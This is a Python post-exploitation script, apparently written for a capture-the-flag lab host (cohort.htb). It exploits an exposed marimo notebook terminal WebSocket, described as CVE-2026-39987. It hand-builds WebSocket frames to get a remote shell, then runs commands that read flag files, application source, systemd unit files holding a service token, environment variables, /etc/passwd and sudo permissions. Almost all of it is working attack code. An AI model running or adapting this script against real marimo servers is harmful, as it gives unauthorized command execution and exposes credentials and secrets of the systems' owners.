#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Post-exploitation enumeration via marimo /terminal/ws (CVE-2026-39987)
Usage: python3 marimo_enum.py
Collects: flags, insights_api.py source, marimo.service token, sysmon/eBPF,
          users, systemd units, running processes.
"""
import socket, ssl, base64, os, sys, time, re

HOST = 'cohort.htb'
VHOST = 'nb-1be3782a8afd3ad5.cohort.htb'
PORT = 443
PATH = '/terminal/ws'
ANSI = re.compile(rb'\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07]*\x07|\x1b[()][A-Z0-9]|\x1b[=>]|\x1b[<>]')

def build_frame(payload: bytes) -> bytes:
    mask = os.urandom(4)
    n = len(payload)
    if n < 126: hdr = bytes([0x81, 0x80 | n])
    elif n < 65536: hdr = bytes([0x81, 0x80 | 126]) + n.to_bytes(2, 'big')
    else: hdr = bytes([0x81, 0x80 | 127]) + n.to_bytes(8, 'big')
    return hdr + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(payload))

def _recvn(sock, n):
    buf = b''
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c: raise EOFError
        buf += c
    return buf

def recv_frame(sock):
    hdr = _recvn(sock, 2)
    b0, b1 = hdr[0], hdr[1]
    op = b0 & 0x0F
    ln = b1 & 0x7F
    masked = (b1 & 0x80) != 0
    if ln == 126: ln = int.from_bytes(_recvn(sock, 2), 'big')
    elif ln == 127: ln = int.from_bytes(_recvn(sock, 8), 'big')
    mask = _recvn(sock, 4) if masked else b''
    data = _recvn(sock, ln)
    if masked: data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    return op, data

def main():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f'GET {PATH} HTTP/1.1\r\nHost: {VHOST}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n'
           f'Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n').encode()
    sock.sendall(req)
    resp = b''
    while b'\r\n\r\n' not in resp:
        resp += sock.recv(4096)
    head, _ = resp.split(b'\r\n\r\n', 1)
    if b'101' not in head.split(b'\r\n')[0]:
        print('[-] upgrade failed'); sys.exit(1)
    print('[+] connected')
    sock.settimeout(2)

    def drain(seconds):
        out = b''
        t0 = time.time()
        while time.time() - t0 < seconds:
            try:
                op, data = recv_frame(sock)
                if op in (1, 2): out += data
            except Exception:
                time.sleep(0.05)
        return out

    def run(cmd, wait=1.2):
        sock.sendall(build_frame(cmd.encode() + b'\r'))
        time.sleep(wait)
        data = drain(0.8)
        return ANSI.sub(b'', data).decode('utf-8', 'replace').strip()

    drain(2.0)

    commands = [
        'id',
        'cat /home/marimo/user.txt 2>/dev/null; cat /root/root.txt 2>/dev/null',
        'ls -la /home/marimo /home/marimo/notebooks',
        'ls -la /opt /opt/cohort-insights /opt/marimo',
        'cat /opt/cohort-insights/insights_api.py',
        'cat /etc/systemd/system/marimo.service /etc/systemd/system/cohort-insights.service 2>/dev/null',
        'ps auxww | grep -iE "marimo|insights|8888|5000|sysmon" | grep -v grep',
        'env',
        'cat /etc/passwd',
        'sudo -n -l 2>&1',
        'ls -la /opt/sysinternalsEBPF /opt/sysmon 2>/dev/null',
        'find / -name "*.marimo*" -o -name "marimo.toml" 2>/dev/null | head -20',
    ]

    for c in commands:
        print(f'\n######## $ {c} ########')
        out = run(c)
        print(out if out else '(no output)')

    print('\n[+] done')
    sys.exit(0)

main()
